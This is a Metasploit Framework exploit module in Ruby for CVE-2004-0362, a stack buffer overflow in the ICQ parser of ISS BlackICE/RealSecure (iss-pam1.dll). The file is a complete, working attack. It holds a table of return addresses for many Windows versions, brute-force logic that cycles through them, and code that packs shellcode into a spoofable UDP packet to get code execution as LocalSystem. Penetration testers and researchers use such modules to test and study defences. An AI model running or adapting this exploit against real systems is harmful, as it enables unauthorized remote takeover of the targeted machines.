##
# $Id: blackice_pam_icq.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'ISS PAM.dll ICQ Parser Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the ISS products that use
				the iss-pam1.dll ICQ parser (Blackice/RealSecure). Successful exploitation
				will result in arbitrary code execution as LocalSystem. This exploit
				only requires 1 UDP packet, which can be both spoofed and sent to a broadcast
				address.

				The ISS exception handler will recover the process after each overflow, giving
				us the ability to bruteforce the service and exploit it multiple times.
			},
			'Author'         => 'spoonm',
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2004-0362'],
					['OSVDB', '4355'],
					['URL',   'http://www.eeye.com/html/Research/Advisories/AD20040318.html'],
					['URL',   'http://xforce.iss.net/xforce/alerts/id/166'],
				],
			'Payload'        =>
				{
					'Space'           => 504 -31 -4,
					'BadChars'        => "\x00",
					'MinNops'         => 0,
					'MaxNops'         => 0,
					'StackAdjustment' => -3500
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Bruteforce',                   {  } ],
					[ 'Bruteforce iis-pam1.dll',      { 'Targets' => 3 .. 4  } ],
					[ 'Bruteforce NT 4.0',            { 'Targets' => 5 .. 15 } ],
					[ 'iis-pam1.dll 3.6.06',          { 'Ret' => 0x5e0a47ef } ],
					[ 'iis-pam1.dll 3.6.11',          { 'Ret' => 0x5e0da1db } ],
					[ 'WinNT SP3/SP4/SP5',            { 'Ret' => 0x777e79ab } ],
					[ 'WinNT SP4/SP5',                { 'Ret' => 0x7733b8db } ],
					[ 'WinNT SP5/SP6 - advapi32',     { 'Ret' => 0x77dcd1cb } ],
					[ 'WinNT SP3/SP5/SP6 - shell32',  { 'Ret' => 0x77cec080 } ],
					[ 'WinNT SP5/SP6 - mswsock',      { 'Ret' => 0x7767ebca } ],
					[ 'WinXP SP0/SP1 - shell32',      { 'Ret' => 0x776606af } ],
					[ 'WinXP SP0/SP1 - atl',          { 'Ret' => 0x76b305a7 } ],
					[ 'WinXP SP0/SP1 - atl',          { 'Ret' => 0x76e61a21 } ],
					[ 'WinXP SP0/SP1 - ws2_32',       { 'Ret' => 0x71ab7bfb } ],
					[ 'WinXP SP0/SP1 - mswsock',      { 'Ret' => 0x71a5403d } ],
					[ 'Windows 2000 Pro SP4 English', { 'Ret' => 0x7c2ec68b } ],
					[ 'Win2000 SP0 - SP4',            { 'Ret' => 0x750231e2 } ],
					[ 'Win2000 SP2/SP3 - samlib',     { 'Ret' => 0x75159da3 } ],
					[ 'Win2000 SP0/SP1 - activeds',   { 'Ret' => 0x77ed0beb } ],
					[ 'Windows XP Pro SP0 English',   { 'Ret' => 0x77e3171b } ],
					[ 'Windows XP Pro SP1 English',   { 'Ret' => 0x77dc5527 } ],
					[ 'WinXP SP0 - SP1',              { 'Ret' => 0x71aa3a4b } ],
					[ 'Win2003 SP0',                  { 'Ret' => 0x71bf3cc9 } ],
				],
			'DisclosureDate' => 'Mar 18 2004',
			'DefaultTarget'  => 0))

		register_options(
			[
				Opt::RPORT(1)
			], self.class)
	end

	def exploit
		datastore['RPORT'] = rand(65536) if rport == 1

		targs = [ target ]

		if target.name =~ /^Brute/
			if target['Targets']
				targs = []

				target['Targets'].each { |idx|
					targs << targets[idx]
				}
			else
				targs = targets.dup

				targs.delete_at(0)
				targs.delete_at(0)
				targs.delete_at(0)
			end
		end

		targs.each { |targ|
			print_status("Trying target #{targ.name} [#{"%.8x" % targ.ret}]...")

			shellcode = payload.encoded + rand_text_english(payload_space - payload.encoded.length)
			email     = rand_text_english(19) + [targ.ret].pack('V') + shellcode

			# Hopefully this structure is correct -- ported from msf 2.  Blame me
			# (skape) if it doesn't work!
			packet    =
				# SRV_MULTI
				[5, 0, 0, 530, 0, 0, 1161044754, 0, 2].pack('vcVvvvVVc') +
				# SRV_USER_ONLINE
				[5, 0, 0, 110, 0, 0, 1161044754, 0].pack('vcVvvvVV') +
				[1161044754, 1, 0, 0, 0, 0, 0].pack('VVVVcVV') +
				# SRV_META_USER
				[5, 0, 0, 990, 0, 0, 2018915346, 0].pack('vcVvvvVV') +
				"\x00\x00\x0a" + # subcommand / success
				"\x00\x00"     + # nick length / nick
				"\x00\x00"     + # first length / first
				"\x00\x00"     + # last length / last
				[email.length].pack('v') + email +
				"\x00\x00\x00\x00\x00\x00\x00"

			print_status("Sending UDP request to #{datastore['RPORT']} (#{packet.length} bytes)")

			connect_udp(true, { 'CPORT' => 4000 })
			udp_sock.put(packet)
			disconnect_udp

			print_status("Sleeping (giving exception handler time to recover)")

			select(nil,nil,nil,5)
		}
	end

end
